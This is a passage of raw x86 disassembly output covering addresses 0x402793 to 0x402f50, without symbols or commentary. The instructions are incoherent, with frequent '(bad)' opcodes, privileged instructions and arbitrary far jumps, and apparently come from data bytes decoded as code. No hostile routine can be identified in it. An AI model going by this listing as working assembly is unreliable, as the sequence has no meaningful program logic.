  402793:	cmp    BYTE PTR [ebp+0x7c],cl
  402796:	imul   esp,DWORD PTR [eax+ebp*2-0x39],0x36
  40279b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40279c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40279d:	sahf   
  40279e:	dec    esi
  40279f:	sti    
  4027a0:	cmc    
  4027a1:	mov    ebp,0x296075b1
  4027a6:	fisub  DWORD PTR [esi-0x69196240]
  4027ac:	or     al,0x9f
  4027ae:	mov    edi,0xeb80a02
  4027b3:	jbe    0x4027bb
  4027b5:	lods   al,BYTE PTR ds:[esi]
  4027b6:	jmp    0x40281c
  4027b8:	mov    edi,0x11d94625
  4027bd:	lds    ecx,FWORD PTR [eax]
  4027bf:	and    eax,0xbd1797cc
  4027c4:	mov    ecx,0x207c87dc
  4027c9:	(bad)  
  4027ca:	cmove  ebp,DWORD PTR [esi]
  4027cd:	fwait
  4027ce:	call   0x6338:0x692ef86a
  4027d5:	mov    dh,0x19
  4027d7:	ror    edi,1
  4027d9:	faddp  st(5),st
  4027db:	or     dh,BYTE PTR [eax-0x41]
  4027de:	xor    ebp,DWORD PTR [eax]
  4027e0:	adc    ch,BYTE PTR [esi+0x7a5d92b1]
  4027e6:	je     0x40284c
  4027e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4027e9:	and    dh,BYTE PTR ds:0x86799c9a
  4027ef:	and    DWORD PTR [ebx-0x64],ebp
  4027f2:	and    al,0x6a
  4027f4:	inc    DWORD PTR [edx+0x5c]
  4027f7:	mov    al,0xe5
  4027f9:	cld    
  4027fa:	mov    edi,0xbbbb92b1
  4027ff:	xchg   edx,eax
  402800:	out    dx,al
  402801:	inc    edi
  402802:	call   0x46c9fcc7
  402807:	jno    0x402831
  402809:	pop    edi
  40280a:	nop
  40280b:	push   es
  40280c:	or     eax,0x8270c693
  402811:	jl     0x40280e
  402813:	adc    BYTE PTR [ebx],bl
  402815:	jae    0x4027aa
  402817:	xlat   BYTE PTR ds:[ebx]
  402818:	mov    dh,0x5
  40281a:	pop    ebp
  40281b:	mov    al,dh
  40281d:	xor    DWORD PTR [ebx],0x41
  402820:	add    al,ah
  402822:	mov    ds:0x719d35a1,eax
  402827:	rcr    BYTE PTR [eax+edx*1],0x60
  40282b:	jb     0x4027c3
  40282d:	mov    esi,DWORD PTR [edx+esi*4]
  402830:	dec    ebx
  402831:	and    dl,ah
  402833:	pop    ecx
  402834:	pop    ds
  402835:	dec    esi
  402836:	mov    ebx,0x51d24a9f
  40283b:	hlt    
  40283c:	dec    ebx
  40283d:	mov    ebp,0xfcf9e37e
  402842:	pop    esp
  402843:	adc    al,0x5b
  402845:	(bad)  
  402846:	mov    BYTE PTR [esi],cl
  402848:	push   ds
  402849:	(bad)  
  40284a:	fst    DWORD PTR [eax+0x8]
  40284d:	cmp    BYTE PTR [ebx-0x3c71c42],0xda
  402854:	mov    al,ds:0xe566a960
  402859:	scas   eax,DWORD PTR es:[edi]
  40285a:	mov    ch,bl
  40285c:	fld    DWORD PTR es:[eax+0x4ee84243]
  402863:	adc    DWORD PTR ds:0x63211f91,edx
  402869:	mov    es,edx
  40286b:	jge    0x402868
  40286d:	mov    esi,0xbaa359c0
  402872:	fs (bad) 
  402874:	(bad)  
  402875:	shr    DWORD PTR [ebp+ebp*1+0x75],cl
  402879:	imul   ebx,DWORD PTR [esi],0xffffff9f
  40287c:	and    BYTE PTR [edi],bl
  40287e:	mov    ds:0x20d471cb,al
  402883:	sub    DWORD PTR [esi-0x4f],ecx
  402886:	js     0x402895
  402888:	or     BYTE PTR [ebp+0x63],bh
  40288b:	outs   dx,DWORD PTR ds:[esi]
  40288c:	or     al,0x5b
  40288e:	outs   dx,BYTE PTR ds:[esi]
  40288f:	mov    edx,0xc333c289
  402894:	dec    BYTE PTR [ebp-0x6]
  402897:	xchg   esp,eax
  402898:	mov    BYTE PTR [eiz*2+0x510dc190],ch
  40289f:	cmp    BYTE PTR ds:0xd3d1856c,0x2f
  4028a6:	mov    ah,0x11
  4028a8:	adc    eax,0x646640cb
  4028ad:	cmp    dl,BYTE PTR ds:[ecx+eiz*1]
  4028b1:	cdq    
  4028b2:	push   cs
  4028b3:	lds    eax,FWORD PTR [ebx-0x7]
  4028b6:	sbb    bl,BYTE PTR [ebp-0x5030d952]
  4028bc:	pop    esp
  4028bd:	sub    al,0x17
  4028bf:	aad    0x6f
  4028c1:	pop    ss
  4028c2:	fistp  DWORD PTR [ebx+0x17]
  4028c5:	pop    ebp
  4028c6:	pop    es
  4028c7:	jmp    0x2480:0x7fadcf0f
  4028ce:	xlat   BYTE PTR ds:[ebx]
  4028cf:	jge    0x402893
  4028d1:	fdivp  st(0),st
  4028d3:	mov    bh,0xcd
  4028d5:	scas   al,BYTE PTR es:[edi]
  4028d6:	call   0x7338:0x9b234139
  4028dd:	aam    0x17
  4028df:	inc    eax
  4028e0:	inc    ebx
  4028e1:	jb     0x4028f4
  4028e3:	shl    DWORD PTR [esi+0x77f81bed],1
  4028e9:	rcl    BYTE PTR [eax+0x38],0x56
  4028ed:	aaa    
  4028ee:	jmp    0xee93:0xc9527ff0
  4028f5:	shr    esi,cl
  4028f7:	jns    0x402959
  4028f9:	sub    al,BYTE PTR [eax+0x30bc8b8d]
  4028ff:	cld    
  402900:	mov    DWORD PTR [esi-0x73d99e71],ebx
  402906:	outs   dx,BYTE PTR ds:[esi]
  402907:	mov    ds:0xf572802f,eax
  40290c:	fsub   DWORD PTR fs:[ecx]
  40290f:	frstor [ebp-0x5f]
  402912:	int3   
  402913:	into   
  402914:	mov    eax,0x9d1746d1
  402919:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40291a:	sbb    BYTE PTR [esp+ecx*1+0x3991a249],ah
  402921:	dec    ecx
  402922:	jg     0x402915
  402924:	les    eax,FWORD PTR [ebx+0x118b86c9]
  40292a:	or     bh,BYTE PTR [ebx-0x957f9ac]
  402930:	in     eax,0x3c
  402932:	add    DWORD PTR [edi+ebp*1-0x60],0xffffff90
  402937:	out    0x6d,al
  402939:	lods   al,BYTE PTR ds:[esi]
  40293a:	nop
  40293b:	in     al,0xd9
  40293d:	ds pop eax
  40293f:	ja     0x4029a0
  402941:	cmp    bl,dl
  402943:	cmp    DWORD PTR [eax-0x3579120a],edi
  402949:	call   0x337a:0x4fa1c2e3
  402950:	int    0xf8
  402952:	(bad)  
  402953:	jmp    0x4029ce
  402955:	jne    0x402972
  402957:	jl     0x4028ee
  402959:	and    al,0x25
  40295b:	mov    dh,0x8b
  40295d:	xchg   esp,eax
  40295e:	mov    ecx,0x411c96ff
  402963:	pop    eax
  402964:	xor    DWORD PTR [di+0x4cf7],ebp
  402969:	xchg   edx,eax
  40296a:	pop    ebp
  40296b:	js     0x4029a1
  40296d:	jae    0x402998
  40296f:	sbb    BYTE PTR [ebx],bl
  402971:	jmp    0xe44bd139
  402976:	push   ebx
  402977:	int    0x2e
  402979:	iret   
  40297a:	xchg   ebx,eax
  40297b:	xlat   BYTE PTR ds:[ebx]
  40297c:	jle    0x402997
  40297e:	mov    bh,0x57
  402980:	pushf  
  402981:	mov    eax,0x955ee081
  402986:	and    BYTE PTR [ebx-0x6a],ch
  402989:	sbb    DWORD PTR [ebx],edi
  40298b:	dec    eax
  40298c:	dec    eax
  40298d:	int    0x70
  40298f:	dec    esp
  402990:	sbb    ebp,esi
  402992:	enter  0x11f7,0x9c
  402996:	sub    esp,ecx
  402998:	cmp    al,BYTE PTR [ebx+0x69ee3ddb]
  40299e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40299f:	retf   0xb657
  4029a2:	and    eax,0xae18b61
  4029a7:	scas   eax,DWORD PTR es:[edi]
  4029a8:	inc    ecx
  4029a9:	ss jbe 0x4029bb
  4029ac:	xchg   edx,eax
  4029ad:	rol    BYTE PTR [eax-0x48f7b80e],1
  4029b3:	rsm    
  4029b5:	xchg   BYTE PTR [ecx],ah
  4029b7:	pop    ebx
  4029b8:	dec    esp
  4029b9:	call   0x8243da06
  4029be:	cmp    dh,BYTE PTR [ebx+0x3]
  4029c1:	jbe    0x402966
  4029c3:	fwait
  4029c4:	push   edi
  4029c5:	sub    bl,BYTE PTR [edi+0x78780a82]
  4029cb:	xor    al,0x0
  4029cd:	cli    
  4029ce:	mov    edx,0x468ba276
  4029d3:	add    bh,BYTE PTR [ecx+0x41]
  4029d6:	fwait
  4029d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4029d8:	xor    al,BYTE PTR [ebx+0x54]
  4029db:	fisubr WORD PTR [esi+eiz*4+0x4ed6e132]
  4029e2:	adc    cl,bh
  4029e4:	xchg   ecx,eax
  4029e5:	fld    TBYTE PTR [ecx]
  4029e7:	out    0x5a,eax
  4029e9:	adc    bl,BYTE PTR [ecx+esi*1-0x6b19ad23]
  4029f0:	cmp    BYTE PTR [ebp-0x5c],0xf9
  4029f4:	inc    edx
  4029f5:	sar    DWORD PTR [esi+0x2fa73f18],0xb8
  4029fc:	xchg   BYTE PTR [edx+eiz*4],cl
  4029ff:	dec    edi
  402a00:	xchg   esi,eax
  402a01:	cdq    
  402a02:	cdq    
  402a03:	fadd   QWORD PTR [edx-0x1d]
  402a06:	mov    edx,0xfb8b3ade
  402a0b:	retf   0x18e8
  402a0e:	loop   0x4029de
  402a10:	inc    ebp
  402a11:	int3   
  402a12:	call   FWORD PTR [esi+0x1538afc3]
  402a18:	outs   dx,DWORD PTR ds:[esi]
  402a19:	inc    ecx
  402a1a:	or     edi,DWORD PTR [ecx-0x10]
  402a1d:	aas    
  402a1e:	mov    DWORD PTR [ebp+0x12],esp
  402a21:	pop    ds
  402a22:	xor    al,0xab
  402a24:	imul   edi,DWORD PTR [ecx],0xffffff9a
  402a27:	lods   al,BYTE PTR ds:[esi]
  402a28:	popf   
  402a29:	and    DWORD PTR [edi+edx*4-0x52],0xf
  402a2e:	enter  0xb05a,0x65
  402a32:	sub    eax,0x76a5ec40
  402a37:	mov    edx,0x8245cbc4
  402a3c:	mov    cs,esp
  402a3e:	das    
  402a3f:	iret   
  402a40:	pusha  
  402a41:	add    eax,0x90efcda3
  402a46:	mov    al,ds:0xfec9bbe2
  402a4b:	sahf   
  402a4c:	jle    0x402a01
  402a4e:	retf   0x285
  402a51:	cmovne eax,esi
  402a54:	cs hlt 
  402a56:	ins    BYTE PTR es:[edi],dx
  402a57:	inc    ecx
  402a58:	sub    BYTE PTR [eax],ch
  402a5a:	test   BYTE PTR [ecx],0x4b
  402a5d:	mov    eax,ds:0x51c9f4ef
  402a62:	shr    BYTE PTR [ebp-0x77e2fd76],cl
  402a68:	xchg   ebx,eax
  402a69:	mov    esi,0x3e5bebe4
  402a6e:	scas   al,BYTE PTR es:[edi]
  402a6f:	dec    ecx
  402a70:	xor    eax,DWORD PTR [esi+ecx*1-0x7b97f533]
  402a77:	fild   QWORD PTR [eax-0x76e88e78]
  402a7d:	ret    0xcd6a
  402a80:	pop    ss
  402a81:	retf   0xa615
  402a84:	gs cmc 
  402a86:	pusha  
  402a87:	inc    edx
  402a88:	ja     0x402adf
  402a8a:	cwde   
  402a8b:	sbb    BYTE PTR [ecx-0x57],cl
  402a8e:	test   al,0x20
  402a90:	iretw  
  402a92:	out    0xf0,al
  402a94:	xchg   edx,eax
  402a95:	dec    esp
  402a96:	icebp  
  402a97:	cld    
  402a98:	sbb    DWORD PTR [ebx],ebp
  402a9a:	cwde   
  402a9b:	js     0x402a40
  402a9d:	inc    esi
  402a9e:	pop    es
  402a9f:	mov    ecx,0xa85e44a3
  402aa4:	imul   esi,DWORD PTR [edi+0x5],0xffffffd3
  402aa8:	test   BYTE PTR [edx],dl
  402aaa:	iret   
  402aab:	out    dx,eax
  402aac:	cli    
  402aad:	jmp    0xf12b6ea4
  402ab2:	mov    eax,0x14625fab
  402ab7:	dec    edi
  402ab8:	rcr    BYTE PTR [ebx],1
  402aba:	cmp    al,0xf8
  402abc:	pushf  
  402abd:	sub    dl,al
  402abf:	clc    
  402ac0:	cmp    BYTE PTR [eax],dl
  402ac2:	out    dx,al
  402ac3:	stc    
  402ac4:	and    BYTE PTR [edi],bh
  402ac6:	lahf   
  402ac7:	push   eax
  402ac8:	mov    ebx,0x22945775
  402acd:	dec    ebp
  402ace:	out    dx,eax
  402acf:	pop    ss
  402ad0:	cmp    al,0xd0
  402ad2:	jmp    0x80ca:0xd7a6d3a3
  402ad9:	ins    DWORD PTR es:[edi],dx
  402ada:	jecxz  0x402b53
  402adc:	outs   dx,DWORD PTR ds:[esi]
  402add:	xchg   ecx,eax
  402ade:	sub    DWORD PTR [ebp-0xefe1c19],ecx
  402ae4:	inc    edi
  402ae5:	pop    ebx
  402ae6:	iret   
  402ae7:	jns    0x402b10
  402ae9:	repz jnp 0x402b25
  402aec:	mov    esi,0x3ead2639
  402af1:	scas   al,BYTE PTR es:[edi]
  402af2:	lds    edx,FWORD PTR [edi]
  402af4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402af5:	clc    
  402af6:	inc    esp
  402af7:	outs   dx,BYTE PTR ds:[esi]
  402af8:	and    ecx,DWORD PTR [edx+0x153a711a]
  402afe:	aad    0x9b
  402b00:	push   ebx
  402b01:	jae    0x402b36
  402b03:	scas   eax,DWORD PTR es:[edi]
  402b04:	inc    edi
  402b05:	ror    BYTE PTR [ebx],0x18
  402b08:	popa   
  402b09:	fidiv  DWORD PTR ds:0x3190bf1e
  402b0f:	jmp    0xfea74d61
  402b14:	pop    ebx
  402b15:	(bad)  
  402b16:	shl    dl,0x98
  402b19:	mov    ch,0x1d
  402b1b:	and    ebp,edx
  402b1d:	sar    DWORD PTR [esi],0x26
  402b20:	sbb    BYTE PTR [bx+si-0x11ce],bh
  402b25:	fistp  QWORD PTR [esi]
  402b27:	outs   dx,BYTE PTR ds:[esi]
  402b28:	(bad)  
  402b29:	push   esi
  402b2a:	aas    
  402b2b:	inc    eax
  402b2c:	add    DWORD PTR [eiz*2+0x5eaffdca],ebx
  402b33:	mov    BYTE PTR [edi+eiz*1-0x7577670c],0xb1
  402b3b:	test   DWORD PTR [edi],edx
  402b3d:	ja     0x402b39
  402b3f:	lods   eax,DWORD PTR ds:[esi]
  402b40:	or     eax,0x82068c1e
  402b45:	lahf   
  402b46:	dec    esp
  402b47:	test   al,0xe7
  402b49:	inc    ebx
  402b4a:	cmp    DWORD PTR [ebx],0xffffffae
  402b4d:	sbb    DWORD PTR [edi+0x20ef62d7],ecx
  402b53:	inc    ecx
  402b54:	aaa    
  402b55:	mov    DWORD PTR [ebp-0x52],edi
  402b58:	and    al,0xdf
  402b5a:	mul    cl
  402b5c:	pop    ebx
  402b5d:	fnstcw WORD PTR [ecx+ebx*8+0xa]
  402b61:	sbb    eax,ecx
  402b63:	push   0xab262a1c
  402b68:	neg    DWORD PTR [ecx-0x7e51c6b6]
  402b6e:	imul   ebp,DWORD PTR [ebx],0x25
  402b71:	loopne 0x402b8b
  402b73:	mov    DWORD PTR [ebp+edi*2-0x34],ecx
  402b77:	sub    eax,0x8d8910d2
  402b7c:	shr    esi,1
  402b7e:	icebp  
  402b7f:	xchg   ebx,eax
  402b80:	jne    0x402b08
  402b82:	out    0xd8,al
  402b84:	clc    
  402b85:	pop    edx
  402b86:	addr16 inc ebp
  402b88:	mov    edi,0xf0f370da
  402b8d:	idiv   DWORD PTR ds:0xa99623b8
  402b93:	adc    eax,esi
  402b95:	scas   eax,DWORD PTR es:[edi]
  402b96:	popa   
  402b97:	clc    
  402b98:	cmp    DWORD PTR [esi-0x7a],0xffffff80
  402b9c:	dec    esp
  402b9d:	mov    ah,0xab
  402b9f:	aaa    
  402ba0:	rcl    DWORD PTR [edi],1
  402ba2:	push   ecx
  402ba3:	push   ebx
  402ba4:	in     al,0x2
  402ba6:	sbb    ebp,DWORD PTR [eax-0x2386d4b4]
  402bac:	pushf  
  402bad:	adc    esi,DWORD PTR [edi+0x53]
  402bb0:	jp     0x402bcb
  402bb2:	sub    esp,ecx
  402bb4:	inc    ebx
  402bb5:	xor    ebx,DWORD PTR [ebx-0x79db2fbb]
  402bbb:	imul   ebp,DWORD PTR [edx-0x3a7fd26a],0xffffffa5
  402bc2:	neg    eax
  402bc4:	idiv   DWORD PTR [ecx+0xfeccfa5]
  402bca:	popa   
  402bcb:	(bad)  
  402bcc:	icebp  
  402bcd:	in     al,0x7c
  402bcf:	dec    edx
  402bd0:	sbb    eax,0x32b92a6d
  402bd5:	xor    DWORD PTR [edi],0x3aef693a
  402bdb:	mov    ah,0x15
  402bdd:	xor    ah,al
  402bdf:	mov    ds:0x53f21665,eax
  402be4:	adc    eax,0x6b9e7230
  402be9:	popa   
  402bea:	outs   dx,BYTE PTR ds:[esi]
  402beb:	shl    DWORD PTR [eax+0x32],1
  402bee:	xor    eax,0x25eefa92
  402bf3:	push   esi
  402bf4:	xor    DWORD PTR [esi],ebx
  402bf6:	inc    eax
  402bf7:	jg     0x402c5b
  402bf9:	push   ecx
  402bfa:	pusha  
  402bfb:	inc    eax
  402bfc:	(bad)  
  402bfd:	sbb    eax,0x6938ac9a
  402c02:	mov    eax,ds:0xb3bbdecb
  402c07:	jg     0x402c24
  402c09:	test   al,0x60
  402c0b:	cmp    al,0xbc
  402c0d:	in     eax,dx
  402c0e:	mov    eax,0x59807942
  402c13:	xor    cl,bl
  402c15:	cwde   
  402c16:	sbb    eax,0x8c82a658
  402c1b:	movq   mm0,QWORD PTR ds:0x962223ed
  402c22:	fild   DWORD PTR [eax]
  402c24:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402c25:	rcr    BYTE PTR es:[eax+0x29],1
  402c29:	(bad)  
  402c2b:	out    0x33,al
  402c2d:	push   0x8dca7e2a
  402c32:	sbb    al,BYTE PTR [edx]
  402c34:	fcmovnu st,st(7)
  402c36:	cmp    al,0xd7
  402c38:	jo     0x402ca4
  402c3a:	pop    ecx
  402c3b:	rol    DWORD PTR ds:0x471a0313,1
  402c41:	jo     0x402c22
  402c43:	in     al,dx
  402c44:	or     BYTE PTR [ebx+0x6e4fac7],0x6
  402c4b:	test   BYTE PTR [edx],bl
  402c4d:	sbb    ch,BYTE PTR [edi-0x6388be66]
  402c53:	dec    ecx
  402c54:	pop    esp
  402c55:	adc    edi,ecx
  402c57:	ret    
  402c58:	imul   BYTE PTR [ecx+0x39f07624]
  402c5e:	xor    al,0x85
  402c60:	shl    DWORD PTR [eax-0x5c38e3b5],0x88
  402c67:	jnp    0x402c9e
  402c69:	and    esp,esi
  402c6b:	xchg   edi,eax
  402c6c:	mov    al,ds:0x66f57649
  402c71:	dec    edi
  402c72:	or     al,0x20
  402c74:	add    BYTE PTR ds:0xc8a1d05a,ah
  402c7a:	jmp    0xcb52:0x4ebdc8ca
  402c81:	and    bh,cl
  402c83:	xor    eax,0x2d5711f0
  402c88:	aaa    
  402c89:	out    dx,eax
  402c8a:	pop    ds
  402c8b:	(bad)  
  402c8c:	iret   
  402c8d:	stc    
  402c8e:	ret    
  402c8f:	les    esp,FWORD PTR [edi+0x1f]
  402c92:	js     0x402ce6
  402c94:	(bad)  
  402c95:	dec    eax
  402c96:	pop    ecx
  402c97:	sbb    edi,0x6c1161a1
  402c9d:	pop    ebx
  402c9e:	or     bl,BYTE PTR [eax+0xd3e5394]
  402ca4:	test   al,0x5b
  402ca6:	mov    ah,0x1c
  402ca8:	xor    ah,bh
  402caa:	add    al,BYTE PTR [eax-0x3f]
  402cad:	cmp    BYTE PTR [ebp+0x109e5404],bh
  402cb3:	repz sbb edi,DWORD PTR [esi-0x60b8f7dc]
  402cba:	sar    ch,1
  402cbc:	arpl   WORD PTR [edi-0x57],ax
  402cbf:	inc    ebp
  402cc0:	stc    
  402cc1:	sub    cl,BYTE PTR [esp+eax*8]
  402cc4:	dec    esi
  402cc5:	add    eax,0x617397b1
  402cca:	mov    dl,0x7b
  402ccc:	sahf   
  402ccd:	dec    eax
  402cce:	rcr    BYTE PTR [ebp+0x4aa4b3e],0x62
  402cd5:	xor    eax,0xecbaeca1
  402cda:	out    dx,eax
  402cdb:	(bad)  
  402cdc:	xor    edx,DWORD PTR [eax]
  402cde:	lods   al,BYTE PTR ds:[esi]
  402cdf:	mov    al,0x6e
  402ce1:	ret    0xa6cf
  402ce4:	push   edx
  402ce5:	xchg   DWORD PTR fs:[eax+0x1a],esp
  402ce9:	out    0x9e,al
  402ceb:	fisubr WORD PTR [edx-0x29]
  402cee:	imul   edi,edi,0xa3dee2eb
  402cf4:	fimul  WORD PTR ds:0xe901348
  402cfa:	inc    esp
  402cfb:	push   eax
  402cfc:	test   dh,cl
  402cfe:	not    ah
  402d00:	daa    
  402d01:	loope  0x402d06
  402d03:	pop    esp
  402d04:	out    0x14,eax
  402d06:	aad    0xa
  402d08:	mov    ecx,0xe31e00a8
  402d0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402d0e:	cmp    al,0x3e
  402d10:	mov    eax,0xf75da731
  402d15:	cli    
  402d16:	sub    ah,dl
  402d18:	cmp    eax,0xe7049320
  402d1d:	mov    ebp,0xa0105dbc
  402d22:	add    eax,0xa0cc00
  402d27:	retf   
  402d28:	jo     0x402d29
  402d2a:	ds or  al,0xe7
  402d2d:	and    esi,esp
  402d2f:	retf   
  402d30:	mov    ah,BYTE PTR [eax]
  402d32:	and    DWORD PTR ds:0x3cff8b85,eax
  402d38:	dec    edx
  402d39:	mov    DWORD PTR [esi+edi*4-0x8],ecx
  402d3d:	hlt    
  402d3e:	out    0x28,al
  402d40:	add    edx,DWORD PTR [ecx+0x1b]
  402d43:	out    dx,al
  402d44:	dec    DWORD PTR [esi-0x7e]
  402d47:	push   esi
  402d48:	sbb    dl,0x63
  402d4b:	push   ebp
  402d4c:	push   ebp
  402d4d:	aas    
  402d4e:	push   es
  402d4f:	stc    
  402d50:	adc    al,0xdd
  402d52:	mov    fs,WORD PTR [edx+0x6e5ef58d]
  402d58:	jae    0x402cf6
  402d5a:	dec    edx
  402d5b:	lods   eax,DWORD PTR ds:[esi]
  402d5c:	jmp    0x53fba465
  402d61:	pop    ebx
  402d62:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402d63:	and    DWORD PTR [ebx+0x71],edi
  402d66:	in     eax,0xf4
  402d68:	mov    edi,0x6551cb52
  402d6d:	mov    ds:0x3d732b96,eax
  402d72:	xchg   ebp,eax
  402d73:	mov    ebx,0x80be8cb1
  402d78:	retf   
  402d79:	js     0x402cfc
  402d7b:	push   edi
  402d7c:	mov    edx,DWORD PTR [ebp-0x5b4ab2df]
  402d82:	push   esp
  402d83:	daa    
  402d84:	icebp  
  402d85:	sbb    DWORD PTR [edi+0x5d7cdaca],0x10
  402d8c:	pop    ebp
  402d8d:	sub    eax,0x3a7bf07f
  402d92:	jmp    0x402d44
  402d94:	stos   DWORD PTR es:[edi],eax
  402d95:	inc    ebp
  402d96:	inc    ecx
  402d97:	pop    eax
  402d98:	or     esp,eax
  402d9a:	(bad)  
  402d9b:	sub    al,0xa2
  402d9d:	sbb    edi,DWORD PTR [ecx+0x28b32040]
  402da3:	arpl   WORD PTR [edi],bx
  402da5:	inc    edx
  402da6:	pop    edx
  402da7:	imul   eax,esp,0xffffffa6
  402daa:	test   al,0x3a
  402dac:	push   ds
  402dad:	imul   edx,DWORD PTR [ecx+0x59],0x3aeda41e
  402db4:	call   0x7a8a9d9b
  402db9:	aas    
  402dba:	push   esp
  402dbb:	add    al,0x10
  402dbd:	clc    
  402dbe:	call   0xa877:0xc3835925
  402dc5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402dc6:	inc    ecx
  402dc7:	dec    edi
  402dc8:	push   esp
  402dc9:	(bad)  
  402dca:	ficomp DWORD PTR [ebx+0x7ed5084f]
  402dd0:	xor    edi,DWORD PTR [eax+0x3aef1cfb]
  402dd6:	or     DWORD PTR [ebx-0x502f39e5],0xffffffc2
  402ddd:	inc    ecx
  402dde:	pop    esi
  402ddf:	jnp    0x402e0f
  402de1:	data16 sahf 
  402de3:	(bad)  
  402de4:	fiadd  DWORD PTR [ebp-0x66bea95a]
  402dea:	jb     0x402dfa
  402dec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402ded:	loop   0x402d9d
  402def:	lahf   
  402df0:	je     0x402e51
  402df2:	fwait
  402df3:	std    
  402df4:	imul   esi,DWORD PTR [ebp+ebp*2+0x2b],0xa690ebc6
  402dfc:	int3   
  402dfd:	jl     0x402da4
  402dff:	pop    ebp
  402e00:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402e01:	aad    0x7
  402e03:	fdivr  QWORD PTR [edi]
  402e05:	jp     0x402e6f
  402e07:	int3   
  402e08:	adc    ebp,ebp
  402e0a:	shl    DWORD PTR [eax-0x4c42458c],cl
  402e10:	sub    al,0xad
  402e12:	fdivr  QWORD PTR [ebx-0x6c2ec486]
  402e18:	adc    DWORD PTR [edx-0x558758f7],0xd4ea1ff1
  402e22:	test   eax,0xddceccca
  402e27:	(bad)  
  402e28:	mov    esi,ebx
  402e2a:	jge    0x402e3f
  402e2c:	cmc    
  402e2d:	mov    BYTE PTR [edx+ebx*4],ah
  402e30:	inc    esp
  402e31:	lds    esi,FWORD PTR [ebp+0x3d]
  402e34:	inc    edi
  402e35:	fwait
  402e36:	jg     0x402e63
  402e38:	adc    BYTE PTR [ecx-0x38514a3d],bh
  402e3e:	mov    ah,0x40
  402e40:	inc    ecx
  402e41:	sub    DWORD PTR [esi],eax
  402e43:	jbe    0x402ebd
  402e45:	inc    ebp
  402e46:	xchg   ebp,eax
  402e47:	enter  0x2632,0x91
  402e4b:	lahf   
  402e4c:	jp     0x402e7d
  402e4e:	adc    esp,ecx
  402e50:	pop    edi
  402e51:	(bad)  
  402e52:	xor    dl,BYTE PTR [ecx]
  402e54:	dec    esi
  402e55:	and    eax,0xaa2529b0
  402e5a:	adc    bl,BYTE PTR [eax+0x706328a4]
  402e60:	dec    ebp
  402e61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402e62:	int    0xac
  402e64:	rep stos DWORD PTR es:[edi],eax
  402e66:	hlt    
  402e67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402e68:	ret    
  402e69:	sub    esp,DWORD PTR ds:0x8174fa17
  402e6f:	shl    BYTE PTR [ecx],1
  402e71:	popa   
  402e72:	xchg   DWORD PTR [esi-0x2385495e],edx
  402e78:	in     al,0x92
  402e7a:	mov    edi,0xf51580ac
  402e7f:	mov    DWORD PTR [edx+0x78],ebx
  402e82:	adc    BYTE PTR [edx-0x4b8e497e],bh
  402e88:	jg     0x402e8d
  402e8a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402e8b:	ss in  eax,dx
  402e8d:	outs   dx,DWORD PTR ds:[esi]
  402e8e:	jl     0x402e99
  402e90:	in     al,0xe2
  402e92:	push   es
  402e93:	jbe    0x402e8b
  402e95:	push   ebx
  402e96:	or     al,0x19
  402e98:	outs   dx,BYTE PTR ds:[esi]
  402e99:	fcomp  QWORD PTR [edi]
  402e9b:	cmp    cl,ch
  402e9d:	adc    DWORD PTR [ebp+0x1a],edx
  402ea0:	cli    
  402ea1:	jne    0x402e88
  402ea3:	arpl   WORD PTR [edi],cx
  402ea5:	xor    al,0x3d
  402ea7:	mov    edx,0x4d412ff
  402eac:	pop    ebx
  402ead:	or     al,0x11
  402eaf:	jnp    0x402e6f
  402eb1:	xchg   BYTE PTR [esi+0x48],bh
  402eb4:	jmp    0x741e9f8d
  402eb9:	mov    ds:0xd0400cab,al
  402ebe:	xchg   edi,eax
  402ebf:	dec    ebp
  402ec0:	out    0x5d,eax
  402ec2:	shr    BYTE PTR [ecx+0x78],cl
  402ec5:	pop    ecx
  402ec6:	out    dx,eax
  402ec7:	mov    cl,0x62
  402ec9:	cmc    
  402eca:	sahf   
  402ecb:	sub    eax,0x1278320e
  402ed0:	int    0x93
  402ed2:	call   0x8edf4c13
  402ed7:	hlt    
  402ed8:	add    ch,BYTE PTR ds:0xe193051b
  402ede:	pmulhuw mm7,QWORD PTR [edi-0x71c3637f]
  402ee5:	imul   ecx,DWORD PTR [edi-0x6c],0xe8d598c7
  402eec:	and    ch,al
  402eee:	fbstp  TBYTE PTR [ebp-0x57018c03]
  402ef4:	leave  
  402ef5:	xlat   BYTE PTR ds:[ebx]
  402ef6:	xchg   ebx,eax
  402ef7:	xor    ebp,DWORD PTR ds:0xb22f6bc7
  402efd:	mov    esi,0x55cf4a1f
  402f02:	pop    esi
  402f03:	pop    ebp
  402f04:	push   ds
  402f05:	xchg   edx,eax
  402f06:	push   esi
  402f07:	push   esi
  402f08:	mov    si,0xd956
  402f0c:	sbb    eax,0xfbbaf025
  402f11:	cmp    BYTE PTR [ebx-0x49bae105],dh
  402f17:	adc    al,0x59
  402f19:	jg     0x402eef
  402f1b:	push   esp
  402f1c:	shl    BYTE PTR [ebx],1
  402f1e:	test   al,dh
  402f20:	into   
  402f21:	push   ebp
  402f22:	push   edx
  402f23:	sbb    DWORD PTR [ecx-0x346eb430],0x8a576f5e
  402f2d:	sbb    DWORD PTR [edx+0x3c40df84],ebp
  402f33:	aas    
  402f34:	daa    
  402f35:	mov    eax,ds:0x60c717d1
  402f3a:	ds aaa 
  402f3c:	lods   al,BYTE PTR ds:[esi]
  402f3d:	adc    BYTE PTR [esi-0x49],dh
  402f40:	push   ds
  402f41:	ret    0xbc65
  402f44:	div    DWORD PTR [esi-0x68]
  402f47:	into   
  402f48:	data16 aad 0x55
  402f4b:	lods   al,BYTE PTR ds:[esi]
  402f4c:	or     esi,ebp
  402f4e:	push   0x3b
  402f50:	jl     0x402f92
